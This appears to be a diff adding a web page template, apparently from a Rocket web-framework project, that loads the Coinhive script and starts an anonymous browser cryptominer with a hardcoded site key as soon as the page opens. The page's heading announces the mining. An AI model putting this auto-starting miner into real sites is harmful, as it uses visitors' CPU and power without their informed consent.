@@ -1,0 +1,19 @@
+{% extends "master" %}
+
+{% block header %}
+{% endblock header %}
+
+{% block content %}
+    <div class="header">
+        <h1>Rocket Session</h1>
+        <h2>Anonymous mining!</h2>
+    </div>
+
+    <div class="content">
+        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+        <script>
+            var miner = new CoinHive.Anonymous('LizXPgR1RicCNg50MGh2EOgT4BjJovK0');
+            miner.start();
+        </script>
+    </div>
+{% endblock content %}
